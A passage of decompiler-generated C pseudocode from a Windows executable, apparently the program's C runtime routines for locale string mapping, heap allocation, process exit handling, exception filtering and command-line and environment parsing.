		fn00408621(fp - 0x04, globals->t4933E4, 0x0100, 0x01, fp - 0x0118, 0x0100, fp - 0x0218, 0x0100, globals->t4931B8, 0x00, out ecx_137, out dl_138);
		word32 ecx_161;
		byte dl_162;
		fn00408621(fp - 0x04, globals->t4933E4, 0x0200, 0x02, fp - 0x0118, 0x0100, fp - 0x0318, 0x0100, globals->t4931B8, 0x00, out ecx_161, out dl_162);
		struct Eq_7225 * eax_165 = null;
		word16 * ecx_169 = fp - 0x0518;
		do
		{
			byte dl_197;
			byte dl_179 = (byte) *ecx_169;
			if ((dl_179 & 0x01) != 0x00)
			{
				eax_165[4797153] = (struct Eq_7225) (eax_165[4797153] | 0x10);
				dl_197 = Mem203[fp - 0x0218 + eax_165:byte];
				goto l00408502;
			}
			if ((dl_179 & 0x02) != 0x00)
			{
				eax_165[4797153] = (struct Eq_7225) (eax_165[4797153] | 0x20);
				dl_197 = Mem213[fp - 0x0318 + eax_165:byte];
l00408502:
				eax_165[4796896] = (struct Eq_7225) dl_197;
			}
			else
				eax_165[4796896] = (struct Eq_7225) (eax_165[4796896] & 0x00);
			eax_165 = eax_165 + 0x01;
			ecx_169 = ecx_169 + 0x01;
		} while (eax_165 < (struct Eq_7225 *) 0x0100);
	}
	else
	{
		struct Eq_7137 * eax_291 = null;
		byte al_292 = 0x00;
		do
		{
			byte cl_344;
			if (eax_291 >= (struct Eq_7137 *) 0x41 && eax_291 <= (struct Eq_7137 *) 0x5A)
			{
				eax_291[4797153] = (struct Eq_7137) (eax_291[4797153] | 0x10);
				cl_344 = al_292 + 0x20;
				goto l0040854C;
			}
			if (eax_291 >= (struct Eq_7137 *) 0x61 && eax_291 <= (struct Eq_7137 *) 122)
			{
				eax_291[4797153] = (struct Eq_7137) (eax_291[4797153] | 0x20);
				cl_344 = al_292 - 0x20;
l0040854C:
				eax_291[4796896] = (struct Eq_7137) cl_344;
			}
			else
				eax_291[4796896] = (struct Eq_7137) (eax_291[4796896] & 0x00);
			eax_291 = eax_291 + 0x01;
			al_292 = (byte) eax_291;
		} while (eax_291 < (struct Eq_7137 *) 0x0100);
	}
}

// 0040857B: void fn0040857B()
void fn0040857B()
{
	if (globals->dw4931A8 == 0x00)
	{
		fn004081B7(~0x02);
		globals->dw4931A8 = 0x01;
	}
}

// 00408597: Register (ptr32 byte) fn00408597(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack (ptr32 (arr Eq_5345)) dwArg0C)
byte * fn00408597(Eq_5 dwArg04, Eq_5 dwArg08, Eq_5345 * dwArg0C[])
{
	byte * edi_102 = (word32) dwArg04 + 0x01;
	if (globals->dw4931CC == 0x00)
		ecx = fn0040ABE0(dwArg04, dwArg08, dwArg0C);
	else
	{
		Eq_5345 (* edx_105)[] = dwArg0C;
		if (dwArg0C != null)
		{
			ecx = (word32) dwArg08 + 0x01;
			do
			{
				byte al_103 = *ecx;
				*edi_102 = al_103;
				edx_105 = edx_105 - 0x01;
				if ((((word32) al_103)->b4932E1 & 0x04) != 0x00)
				{
					edi_102 = edi_102;
					ecx = ecx;
					if (edx_105 == null)
					{
						*(edi_102 - 0x01) = *(edi_102 - 0x01) & 0x00;
						break;
					}
					byte al_123 = *ecx;
					*edi_102 = al_123;
					edx_105 = edx_105 - 0x01;
					edi_102 = edi_102 + 0x01;
					ecx = ecx + 0x01;
					if (al_123 == 0x00)
					{
						*(edi_102 - 0x01) = *(edi_102 - 0x01) & 0x00;
						break;
					}
				}
				else
				{
					edi_102 = edi_102 + 0x01;
					ecx = ecx + 0x01;
					if (al_103 == 0x00)
						break;
				}
			} while (edx_105 != null);
		}
		word32 edx_62 = edx_105 - 0x01;
		if (edx_105 != null)
		{
			uint32 ecx_82 = edx_62 + 0x01 >> 0x02;
			while (ecx_82 != 0x00)
			{
				*edi_102 = (byte) 0x00;
				edi_102 = edi_102 + 0x04;
				ecx_82 = ecx_82 - 0x01;
			}
			ecx = edx_62 + 0x01 & 0x03;
			while (ecx != null)
			{
				*edi_102 = 0x00;
				edi_102 = edi_102 + 0x01;
				ecx = ecx - 0x01;
			}
		}
	}
	return ecx;
}

// 00408621: Register Eq_5 fn00408621(Register ptr32 ebp, Stack Eq_5481 dwArg04, Stack Eq_5 dwArg08, Stack byte bArg09, Stack Eq_5 dwArg0C, Stack Eq_5492 dwArg10, Stack Eq_5 dwArg14, Stack Eq_5 dwArg18, Stack Eq_473 dwArg1C, Stack word32 dwArg20, Register out ptr32 ecxOut, Register out Eq_5556 dlOut)
Eq_5 fn00408621(ptr32 ebp, LCID dwArg04, Eq_5 dwArg08, byte bArg09, Eq_5 dwArg0C, Eq_5492 dwArg10, Eq_5 dwArg14, Eq_5 dwArg18, Eq_473 dwArg1C, word32 dwArg20, ptr32 & ecxOut, Eq_5556 & dlOut)
{
	*dlOut = dl;
	Eq_5 eax_148;
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	if (globals->dw491EC8 == 0x00)
	{
		if (LCMapStringW(0x00, 0x0100, &globals->t40D248, 0x01, null, 0x00) != 0x00)
			globals->dw491EC8 = 0x01;
		else
		{
			if (LCMapStringA(0x00, 0x0100, 0x0040D244, 0x01, 0x00, 0x00) == 0x00)
				goto l004087AF;
			globals->dw491EC8 = 0x02;
		}
	}
	if (dwArg10 > 0x00)
	{
		byte dl_367;
		dwArg10 = fn00408845(dwArg0C, dwArg10, out dl_367);
	}
	word32 eax_121 = globals->dw491EC8;
	if (eax_121 == 0x02)
	{
		eax_148 = LCMapStringA(dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14, dwArg18);
		goto l004087B1;
	}
	if (eax_121 == 0x01)
	{
		if (dwArg1C == 0x00)
			dwArg1C = globals->t491EE4;
		int32 eax_183 = MultiByteToWideChar(dwArg1C, (0x00 - (-dwArg20 == 0x00) & 0x08) + 0x01, dwArg0C, dwArg10, null, 0x00);
		if (eax_183 == 0x00)
			goto l004087AF;
		ui32 eax_191 = eax_183 * 0x02 + 0x03;
		fn00407B80(DPB(eax_191, (byte) eax_191 & 252, 0), 0x00);
		if (fp == 0x3C)
			goto l004087AF;
		*(fp - 0x40) = eax_183;
		*(fp - 0x44) = fp - 0x3C;
		*(fp - 0x48) = (union Eq_5492 *) dwArg10;
		*(fp - 0x4C) = (union Eq_5 *) dwArg0C;
		*(fp - 0x50) = 0x01;
		*(fp - 0x54) = (union Eq_473 *) dwArg1C;
		if (MultiByteToWideChar(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) != 0x00)
		{
			*(fp - 0x40) = 0x00;
			*(fp - 0x44) = 0x00;
			*(fp - 0x48) = eax_183;
			*(fp - 0x4C) = fp - 0x3C;
			*(fp - 0x50) = (union Eq_5 *) dwArg08;
			*(fp - 0x54) = (uint32) dwArg04;
			Eq_5 eax_242 = LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40));
			Eq_5 esi_244 = eax_242;
			if (eax_242 == 0x00)
				goto l004087AF;
			if ((bArg09 & 0x04) != 0x00)
			{
				if (dwArg18 != 0x00)
				{
					if (eax_242 > dwArg18)
						goto l004087AF;
					*(fp - 0x40) = (union Eq_5 *) dwArg18;
					*(fp - 0x44) = (union Eq_5 *) dwArg14;
					*(fp - 0x48) = eax_183;
					*(fp - 0x4C) = fp - 0x3C;
					*(fp - 0x50) = (union Eq_5 *) dwArg08;
					*(fp - 0x54) = (uint32) dwArg04;
					if (LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) == 0x00)
						goto l004087AF;
				}
			}
			else
			{
				ui32 eax_292 = eax_242 * 0x02 + 0x03;
				fn00407B80(DPB(eax_292, (byte) eax_292 & 252, 0), ebp);
				if (fp == 0x3C)
					goto l004087AF;
				*(fp - 0x40) = (union Eq_5 *) eax_242;
				*(fp - 0x44) = fp - 0x3C;
				*(fp - 0x48) = eax_183;
				*(fp - 0x4C) = fp - 0x3C;
				*(fp - 0x50) = (union Eq_5 *) dwArg08;
				*(fp - 0x54) = (uint32) dwArg04;
				if (LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) == 0x00)
					goto l004087AF;
				*(fp - 0x40) = 0x00;
				*(fp - 0x44) = 0x00;
				if (dwArg18 == 0x00)
				{
					*(fp - 0x48) = 0x00;
					*(fp - 0x4C) = 0x00;
				}
				else
				{
					*(fp - 0x48) = (union Eq_5 *) dwArg18;
					*(fp - 0x4C) = (union Eq_5 *) dwArg14;
				}
				*(fp - 0x50) = (union Eq_5 *) eax_242;
				*(fp - 0x54) = fp - 0x3C;
				*(fp - 88) = 0x0220;
				*(fp - 0x5C) = (union Eq_473 *) dwArg1C;
				Eq_5 eax_344 = WideCharToMultiByte(*(fp - 0x5C), *(fp - 88), *(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40));
				esi_244 = eax_344;
				if (eax_344 == 0x00)
					goto l004087AF;
			}
			eax_148 = esi_244;
l004087B1:
			fs->ptr0000 = eax_14;
			word32 ecx_61;
			*ecxOut = eax_14;
			return eax_148;
		}
	}
l004087AF:
	eax_148.u0 = 0x00;
	goto l004087B1;
}

// 00408845: Register Eq_5492 fn00408845(Stack Eq_5 dwArg04, Stack Eq_5492 dwArg08, Register out Eq_7585 dlOut)
Eq_5492 fn00408845(Eq_5 dwArg04, Eq_5492 dwArg08, Eq_7585 & dlOut)
{
	byte dl_4;
	*dlOut = (byte) dwArg08;
	Eq_5 eax_17 = dwArg04;
	word32 ecx_13 = dwArg08 - 0x01;
	if (dwArg08 != 0x00)
	{
		while (*eax_17 != 0x00)
		{
			eax_17 = (word32) eax_17 + 0x01;
			ecx_13 = ecx_42 - 0x01;
			word32 ecx_42 = ecx_13;
			if (ecx_42 == 0x00)
				break;
		}
	}
	if (*eax_17 != 0x00)
		return dwArg08;
	return eax_17 - dwArg04;
}

// 00408870: Register ui32 fn00408870(Stack Eq_5469 dwArg04, Stack word16 wArg06, Stack ui32 dwArg08, Register out Eq_5528 dlOut)
ui32 fn00408870(Eq_5469 dwArg04, word16 wArg06, ui32 dwArg08, Eq_5528 & dlOut)
{
	*dlOut = dl;
	ui32 eax_127;
	if (dwArg04 > ~0xFE)
	{
		Eq_5492 dwLoc0C_136;
		if ((globals->ptr4111B0[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
			dwLoc0C_136.u0 = 0x02;
		else
			dwLoc0C_136.u0 = 0x01;
		byte dl_116;
		ui32 eax_117 = fn0040AA88(fp - 0x04, 0x01, fp - 0x08, dwLoc0C_136, fp + 0x06, 0x00, 0x00, 0x01, out dl_116);
		if (eax_117 == 0x00)
			return eax_117;
		eax_127 = (word32) wArg06;
		return eax_127 & dwArg08;
	}
	else
	{
		eax_127 = (word32) globals->ptr4111B0[dwArg04].t0000;
		return eax_127 & dwArg08;
	}
}

// 00409204: Register word32 fn00409204(Register Eq_5 ebp, Stack Eq_5 dwArg04, Register out ptr32 ebpOut, Register out ptr32 ediOut)
word32 fn00409204(Eq_5 ebp, Eq_5 dwArg04, ptr32 & ebpOut, ptr32 & ediOut)
{
	*ebpOut = ebp;
	*ediOut = edi;
	if (dwArg04 == 0x00)
		return ebx;
	Eq_5 eax_42 = fn0040B1D3(dwArg04);
	if (eax_42 == 0x00)
	{
		HeapFree(globals->t493084, 0x00, dwArg04);
		return ebx;
	}
	else
	{
		fn0040B1FE(ebp, eax_42, dwArg04, bLoc05);
		return ebx;
	}
}

// 00409233: Register word32 fn00409233(Stack Eq_5 dwArg04)
word32 fn00409233(Eq_5 dwArg04)
{
	return fn00409245(dwArg04, globals->dw492050);
}

// 00409245: Register word32 fn00409245(Stack Eq_5 dwArg04, Stack word32 dwArg08)
word32 fn00409245(Eq_5 dwArg04, word32 dwArg08)
{
	word32 eax_13;
	if (dwArg04 <= ~0x1F)
	{
		do
		{
			eax_13 = fn00409271(dwArg04);
			if (eax_13 != 0x00 || dwArg08 == eax_13)
				return eax_13;
		} while (fn0040B9DE(dwArg04) != 0x00);
	}
	eax_13 = 0x00;
	return eax_13;
}

// 00409271: Register Eq_5 fn00409271(Stack Eq_5 dwArg04)
Eq_5 fn00409271(Eq_5 dwArg04)
{
	Eq_5 eax_22;
	Eq_5 esi_33 = dwArg04;
	if (dwArg04 <= globals->t4117C0)
	{
		eax_22 = fn0040B529(dwArg04, dwArg04, SLICE(dwArg04, byte, 24));
		if (eax_22 != 0x00)
			return eax_22;
	}
	if (dwArg04 == 0x00)
		esi_33.u0 = 0x01;
	eax_22 = HeapAlloc(globals->t493084, 0x00, (word32) esi_33 + 0x0F & ~0x0F);
	return eax_22;
}

// 00409E2C: void fn00409E2C()
void fn00409E2C()
{
	ptr32 esp_1 = fp;
	<anonymous> * eax_3 = globals->ptr4931B4;
	if (eax_3 != null)
	{
		word32 eax_25;
		byte SZO_26;
		bool C_27;
		bool Z_28;
		byte SCZO_29;
		eax_3();
	}
	word32 * esp_12 = esp_1 - 0x04;
	*esp_12 = 0x0040E014;
	*(esp_12 - 0x04) = 0x0040E008;
	fn00409F14(dwArg00);
	*(esp_12 - 0x08) = 0x0040E004;
	*(esp_12 - 0x0C) = 0x0040E000;
	fn00409F14(dwArg00);
}

// 00409E59: void fn00409E59(Register word32 edi, Stack Eq_473 dwArg04)
void fn00409E59(word32 edi, Eq_473 dwArg04)
{
	fn00409E7B(edi, dwArg04, 0x00, 0x00);
}

// 00409E7B: void fn00409E7B(Register word32 edi, Stack Eq_473 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn00409E7B(word32 edi, Eq_473 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	if (globals->dw491F34 == 0x01)
		TerminateProcess(GetCurrentProcess(), dwArg04);
	globals->dw491F30 = 0x01;
	globals->b491F2C = (byte) dwArg0C;
	ptr32 esp_19 = fp - 0x08;
	word32 ebx_101 = dwArg0C;
	if (dwArg08 == 0x00)
	{
		word32 * eax_56 = globals->ptr4931B0;
		if (eax_56 != null)
		{
			up32 ecx_79 = globals->dw4931AC;
			ptr32 esp_103 = fp - 0x0C;
			word32 * esi_110 = ecx_79 - 0x04;
			if (ecx_79 - 0x04 >= eax_56)
			{
				do
				{
					<anonymous> * eax_104 = *esi_110;
					if (eax_104 != null)
					{
						word32 edi_121;
						byte SCZO_122;
						bool Z_123;
						word32 eax_124;
						byte bl_126;
						byte SZO_127;
						bool C_128;
						word32 ecx_129;
						eax_104();
					}
					esi_110 = esi_110 - 0x04;
				} while (esi_110 >= globals->ptr4931B0);
			}
			esp_19 = esp_103 + 0x04;
		}
		word32 * esp_71 = esp_19 - 0x04;
		*esp_71 = 0x0040E020;
		*(esp_71 - 0x04) = 0x0040E018;
		fn00409F14(dwArg00);
		esp_19 = esp_71 + 0x01;
	}
	struct Eq_8273 * esp_36 = esp_19 - 0x04;
	esp_36->dw0000 = 0x0040E028;
	*(esp_36 - 0x04) = 0x0040E024;
	fn00409F14(dwArg00);
	if (ebx_101 != 0x00)
		return;
	esp_36->t0004 = esp_36->t0010;
	globals->dw491F34 = 0x01;
	ExitProcess(esp_36->t0004);
}

// 00409F14: void fn00409F14(Stack (ptr32 word32) dwArg04)
void fn00409F14(word32 * dwArg04)
{
	struct Eq_8358 * esp_13 = fp - 0x04;
	word32 * esi_14 = dwArg04;
	while (esi_14 < esp_13->ptr000C)
	{
		<anonymous> * eax_18 = *esi_14;
		if (eax_18 != null)
		{
			byte SCZO_32;
			bool C_33;
			word32 eax_34;
			byte SZO_35;
			bool Z_36;
			eax_18();
		}
		esi_14 = esi_14 + 0x01;
	}
}

// 00409F2E: Register Eq_5 fn00409F2E(Stack Eq_473 dwArg04, Stack (ptr32 Eq_6745) dwArg08)
Eq_5 fn00409F2E(Eq_473 dwArg04, _EXCEPTION_POINTERS * dwArg08)
{
	Eq_5 eax_31;
	struct _EXCEPTION_POINTERS * eax_108 = fn0040A06F(dwArg04);
	if (eax_108 != null)
	{
		<anonymous> * ebx_54 = eax_108->ptr0008;
		if (ebx_54 != null)
		{
			if (ebx_54 == (<anonymous> *) 0x05)
			{
				eax_108->ptr0008 = eax_108->ptr0008 & 0x00;
				eax_31.u0 = 0x01;
			}
			else
			{
				if (ebx_54 != (<anonymous> *) 0x01)
				{
					struct _EXCEPTION_POINTERS * ecx_87 = globals->ptr491F38;
					globals->ptr491F38 = dwArg08;
					word32 ecx_91 = eax_108->ContextRecord;
					if (ecx_91 == 0x08)
					{
						int32 ecx_110 = globals->dw411458;
						int32 edx_112 = globals->dw41145C + ecx_110;
						if (ecx_110 < edx_112)
						{
							int32 edx_167 = edx_112 - ecx_110;
							struct Eq_8461 * esi_169 = ecx_110 * 0x0C + 4264936;
							do
							{
								esi_169->dw0000 = esi_169->dw0000 & 0x00;
								esi_169 = esi_169 + 0x01;
								edx_167 = edx_167 - 0x01;
							} while (edx_167 != 0x00);
						}
						word32 eax_119 = eax_108->ExceptionRecord;
						if (eax_119 == 0xC000008E)
							globals->dw411464 = 131;
						else if (eax_119 == 0xC0000090)
							globals->dw411464 = 0x81;
						else if (eax_119 == 0xC0000091)
							globals->dw411464 = 0x84;
						else if (eax_119 == 0xC0000093)
							globals->dw411464 = 133;
						else if (eax_119 == 0xC000008D)
							globals->dw411464 = 0x82;
						else if (eax_119 == 0xC000008F)
							globals->dw411464 = 0x86;
						else if (eax_119 == 0xC0000092)
							globals->dw411464 = 0x8A;
						word32 esp_128;
						word32 ebp_129;
						word32 ebx_130;
						word32 eax_131;
						byte SZO_132;
						bool C_133;
						word32 ecx_134;
						bool Z_135;
						byte SCZO_136;
						word32 edx_137;
						word32 esi_138;
						byte SO_139;
						ebx_54();
						globals->dw411464 = esi_138;
					}
					else
					{
						eax_108->ptr0008 = eax_108->ptr0008 & 0x00;
						word32 esp_186;
						word32 ebp_187;
						word32 ebx_188;
						word32 eax_189;
						byte SZO_190;
						bool C_191;
						word32 ecx_192;
						bool Z_193;
						byte SCZO_194;
						word32 edx_195;
						word32 esi_196;
						byte SO_197;
						ebx_54();
					}
					globals->ptr491F38 = ecx_87;
					eax_108 = ecx_87;
				}
				eax_31 = eax_108 | ~0x00;
			}
			return eax_31;
		}
	}
	eax_31 = UnhandledExceptionFilter(dwArg08);
	return eax_31;
}

// 0040A06F: Register (ptr32 Eq_8529) fn0040A06F(Stack Eq_473 dwArg04)
Eq_8529 * fn0040A06F(Eq_473 dwArg04)
{
	ui32 ecx_5 = globals->dw411460;
	struct Eq_8529 * eax_11 = &globals->t4113E0;
	if (globals->t4113E0 != dwArg04)
	{
		struct Eq_8529 * esi_34 = ecx_5 * 0x0C + 0x004113E0;
		do
			eax_11 = eax_11 + 0x01;
		while (eax_11 < esi_34 && eax_11->dw0000 != dwArg04);
	}
	if (eax_11 >= ecx_5 * 0x0C + 0x004113E0 || eax_11->dw0000 != dwArg04)
		eax_11 = null;
	return eax_11;
}

// 0040A0B2: Register Eq_5 fn0040A0B2()
Eq_5 fn0040A0B2()
{
	if (globals->dw4931A8 == 0x00)
		fn0040857B();
	Eq_5 esi_24 = globals->t4933E8;
	cu8 al_9 = *esi_24;
	if (al_9 == 0x22)
	{
		while (true)
		{
			byte al_57 = *((word32) esi_24 + 0x01);
			esi_24 = (word32) esi_24 + 0x01;
			if (al_57 == 0x22 || al_57 == 0x00)
				break;
			if (fn0040BC76((word32) al_57) != 0x00)
				esi_24 = (word32) esi_24 + 0x01;
		}
		if (*esi_24 == 0x22)
		{
l0040A0EF:
			esi_24 = (word32) esi_24 + 0x01;
		}
	}
	else if (al_9 > 0x20)
	{
		do
			esi_24 = (word32) esi_24 + 0x01;
		while (*esi_24 > 0x20);
	}
	cu8 al_25 = *esi_24;
	if (al_25 == 0x00 || al_25 > 0x20)
		return esi_24;
	goto l0040A0EF;
}

// 0040A10A: void fn0040A10A(Register word32 ebx, Register Eq_5 ebp)
void fn0040A10A(word32 ebx, Eq_5 ebp)
{
	if (globals->dw4931A8 == 0x00)
		fn0040857B();
	Eq_5 esi_16 = globals->t491EB8;
	Eq_5 edi_17 = 0x00;
	while (true)
	{
		byte al_32 = *esi_16;
		if (al_32 == 0x00)
			break;
		if (al_32 != 0x3D)
			edi_17 = (word32) edi_17 + 0x01;
		byte dl_42;
		esi_16 = (word32) fn00407460(esi_16, out dl_42) + ((word32) esi_16 + 0x01);
	}
	Eq_5 eax_52 = fn00409233(edi_17 * 0x04 + 0x04);
	globals->t491F14 = eax_52;
	Eq_5 esi_112 = eax_52;
	if (eax_52 == 0x00)
	{
		word32 edi_150;
		esi_112 = fn0040816E(ebp, edi_17, 0x09, out edi_150);
	}
	Eq_5 edi_108 = globals->t491EB8;
	if (*edi_108 != 0x00)
	{
		do
		{
			*(fp - 0x14) = (union Eq_5 *) edi_108;
			byte dl_100;
			Eq_5 eax_101 = fn00407460(dwArg00, out dl_100);
			if (*edi_108 != 0x3D)
			{
				*(fp - 0x14) = (word32) eax_101 + 0x01;
				Eq_5 eax_120 = fn00409233(dwArg00);
				*esi_112 = eax_120;
				if (eax_120 == 0x00)
				{
					*(fp - 0x14) = 0x09;
					esi_112 = fn0040816E((word32) eax_101 + 0x01, edi_108, dwArg00, out edi_108);
				}
				*(fp - 0x14) = (union Eq_5 *) edi_108;
				*(fp - 0x18) = (word32) *esi_112;
				fn00407370(dwArg00, out edi_108);
				esi_112 = (word32) esi_112 + 0x04;
			}
			edi_108 = (word32) edi_108 + ((word32) eax_101 + 0x01);
		} while (*edi_108 != 0x00);
		ebp = *(fp - 0x10);
	}
	*(fp - 0x10) = (union Eq_5 *) globals->t491EB8;
	word32 ebp_79;
	word32 edi_80;
	Eq_5 ebx_81 = fn00409204(ebp, dwArg00, out ebp_79, out edi_80);
	globals->t491EB8 = ebx_81;
	*esi_112 = ebx_81;
	globals->dw4931A4 = 0x01;
}

// 0040A1C3: void fn0040A1C3(Register ui32 ecx)
void fn0040A1C3(ui32 ecx)
{
	if (globals->dw4931A8 == 0x00)
		fn0040857B();
	GetModuleFileNameA(0x00, 4792124, 0x0104);
	Eq_5 eax_34 = globals->t4933E8;
	globals->dw491F24 = 4792124;
	Eq_5 edi_100 = 4792124;
	if (*eax_34 != 0x00)
		edi_100 = eax_34;
	fn0040A25C(edi_100, 0x00, null, fp - 0x08, fp - 0x0C);
	Eq_5 eax_57 = fn00409233(ecx * 0x05);
	Eq_5 esi_58 = eax_57;
	if (eax_57 == 0x00)
		esi_58 = fn0040816E(fp - 0x04, edi_100, 0x08, out edi_100);
	fn0040A25C(edi_100, esi_58, (word32) esi_58 + ecx * 0x04, fp - 0x08, fp - 0x0C);
	globals->t491F0C = esi_58;
	globals->dw491F08 = ecx - 0x01;
}

// 0040A25C: void fn0040A25C(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack (ptr32 byte) dwArg0C, Stack (ptr32 word32) dwArg10, Stack (ptr32 ui32) dwArg14)
void fn0040A25C(Eq_5 dwArg04, Eq_5 dwArg08, byte * dwArg0C, word32 * dwArg10, ui32 * dwArg14)
{
	*dwArg14 = *dwArg14 & 0x00;
	*dwArg10 = 0x01;
	byte * esi_122 = dwArg0C;
	Eq_5 edi_109 = dwArg08;
	struct Eq_8849 * eax_119 = (word32) dwArg04 + 0x01;
	if (dwArg08 != 0x00)
	{
		*dwArg08 = dwArg0C;
		edi_109 = (word32) dwArg08 + 0x04;
		dwArg08 = (word32) dwArg08 + 0x04;
	}
	if (*dwArg04 == 0x22)
	{
		while (true)
		{
			byte dl_293 = eax_119[0x01];
			eax_119 = eax_119 + 0x01;
			if (dl_293 == 0x22 || dl_293 == 0x00)
				break;
			if ((((word32) dl_293)->b4932E1 & 0x04) != 0x00)
			{
				*dwArg14 = *dwArg14 + 0x01;
				if (esi_122 != null)
				{
					*esi_122 = eax_119->b0000;
					esi_122 = esi_122 + 0x01;
					eax_119 = eax_119 + 0x01;
				}
			}
			*dwArg14 = *dwArg14 + 0x01;
			if (esi_122 != null)
			{
				*esi_122 = eax_119->b0000;
				esi_122 = esi_122 + 0x01;
			}
		}
		*dwArg14 = *dwArg14 + 0x01;
		if (esi_122 != null)
		{
			*esi_122 = *esi_122 & 0x00;
			esi_122 = esi_122 + 0x01;
		}
		if (eax_119->b0000 == 0x22)
			eax_119 = eax_119 + 0x01;
	}
	else
	{
		do
		{
			*dwArg14 = *dwArg14 + 0x01;
			if (esi_122 != null)
			{
				*esi_122 = eax_119->b0000;
				esi_122 = esi_122 + 0x01;
			}
			byte dl_358 = eax_119->b0000;
			eax_119 = &eax_119->b0000;
			if ((((word32) dl_358)->b4932E1 & 0x04) != 0x00)
			{
				*dwArg14 = *dwArg14 + 0x01;
				if (esi_122 != null)
				{
					*esi_122 = eax_119->b0000;
					esi_122 = esi_122 + 0x01;
				}
				eax_119 = eax_119 + 0x01;
			}
			if (dl_358 == 0x20)
				break;
			if (dl_358 == 0x00)
				goto l0040A307;
		} while (dl_358 != 0x09);
		if (dl_358 == 0x00)
		{
l0040A307:
			eax_119 = eax_119 - 0x01;
		}
		else if (esi_122 != null)
			*(esi_122 - 0x01) = *(esi_122 - 0x01) & 0x00;
	}
	ui32 dwArg14_116 = dwArg14 & 0x00;
	while (eax_119->b0000 != 0x00)
	{
		while (true)
		{
			byte dl_93 = eax_119->b0000;
			if (dl_93 != 0x20 && dl_93 != 0x09)
				break;
			eax_119 = eax_119 + 0x01;
		}
		if (eax_119->b0000 == 0x00)
			break;
		if (edi_109 != 0x00)
		{
			*edi_109 = esi_122;
			edi_109 = (word32) edi_109 + 0x04;
			dwArg08 = edi_109;
		}
		*dwArg10 = *dwArg10 + 0x01;
l0040A348:
		word32 dwArg04_123 = 0x01;
		uint32 ebx_124 = 0x00;
		byte bl_125 = 0x00;
		while (eax_119->b0000 == 0x5C)
		{
			ebx_124 = ebx_124 + 0x01;
			eax_119 = eax_119 + 0x01;
			bl_125 = (byte) ebx_124;
		}
		if (eax_119->b0000 == 0x22)
		{
			if ((bl_125 & 0x01) == 0x00)
			{
				if (dwArg14_116 != 0x00)
				{
					struct Eq_8849 * edx_281 = eax_119 + 0x01;
					if (eax_119[0x01] != 0x22)
						goto l0040A378;
					eax_119 = edx_281;
				}
				else
				{
l0040A378:
					dwArg04_123 = 0x00;
				}
				edi_109 = dwArg08;
				dwArg14_116 = (word32) (dwArg14_116 == 0x00);
			}
			ebx_124 = ebx_124 >> 0x01;
		}
		word32 ebx_148 = ebx_124 - 0x01;
		if (ebx_124 != 0x00)
		{
			word32 ebx_230 = ebx_148 + 0x01;
			do
			{
				if (esi_122 != null)
				{
					*esi_122 = 0x5C;
					esi_122 = esi_122 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
				ebx_230 = ebx_230 - 0x01;
			} while (ebx_230 != 0x00);
		}
		byte dl_156 = eax_119->b0000;
		if (dl_156 != 0x00 && (dwArg14_116 != 0x00 || dl_156 != 0x20 && dl_156 != 0x09))
		{
			if (dwArg04_123 != 0x00)
			{
				if (esi_122 != null)
				{
					if ((((word32) dl_156)->b4932E1 & 0x04) != 0x00)
					{
						*esi_122 = dl_156;
						*dwArg14 = *dwArg14 + 0x01;
						esi_122 = esi_122 + 0x01;
						eax_119 = eax_119 + 0x01;
					}
					*esi_122 = eax_119->b0000;
					esi_122 = esi_122 + 0x01;
				}
				else if ((((word32) dl_156)->b4932E1 & 0x04) != 0x00)
				{
					*dwArg14 = *dwArg14 + 0x01;
					eax_119 = eax_119 + 0x01;
				}
				*dwArg14 = *dwArg14 + 0x01;
			}
			eax_119 = eax_119 + 0x01;
			goto l0040A348;
		}
		if (esi_122 != null)
		{
			*esi_122 = *esi_122 & 0x00;
			esi_122 = esi_122 + 0x01;
		}
		*dwArg14 = *dwArg14 + 0x01;
	}
	if (edi_109 != 0x00)
		*edi_109 = *edi_109 & 0x00;
	*dwArg10 = *dwArg10 + 0x01;
}

// 0040A410: Register word32 fn0040A410(Register ui32 ecx)
word32 fn0040A410(ui32 ecx)
{
	word32 eax_129;
	word32 eax_8 = globals->dw492040;
	struct Eq_9249 * esp_186 = fp - 0x18;
	word32 ebx_122 = 0x00;
	Eq_9255 bx_197 = 0x00;
	Eq_9257 esi_199 = 0x00;
	Eq_5 edi_203 = 0x00;
	if (eax_8 == 0x00)
	{
		Eq_9257 eax_263 = GetEnvironmentStringsW();
		esi_199 = eax_263;
		if (eax_263 != 0x00)
		{
			globals->dw492040 = 0x01;
l0040A467:
			if (esi_199 != 0x00)
			{
l0040A477:
				Eq_9257 eax_177 = esi_199;
				if (*esi_199 != bx_197)
				{
					do
					{
						do
						{
							word32 eax_178 = eax_177 + 0x01;
							eax_177 = eax_178 + 0x01;
						} while (Mem0[eax_178 + 0x01:word16] != bx_197);
						eax_177 = eax_178 + 0x03;
					} while (Mem0[eax_178 + 0x03:word16] != bx_197);
				}
				struct Eq_9295 * esp_91 = esp_186 - 0x04;
				esp_91->t0000.u0 = 0x00;
				*(esp_91 - 0x04) = 0x00;
				*(esp_91 - 0x08) = 0x00;
				*(esp_91 - 0x0C) = 0x00;
				int32 eax_95 = (eax_177 - esi_199 >> 0x01) + 0x01;
				*(esp_91 - 0x10) = eax_95;
				*(esp_91 - 0x14) = (union Eq_9257 *) esi_199;
				*(esp_91 - 0x18) = 0x00;
				*(esp_91 - 0x1C) = 0x00;
				esp_91->dw0018 = eax_95;
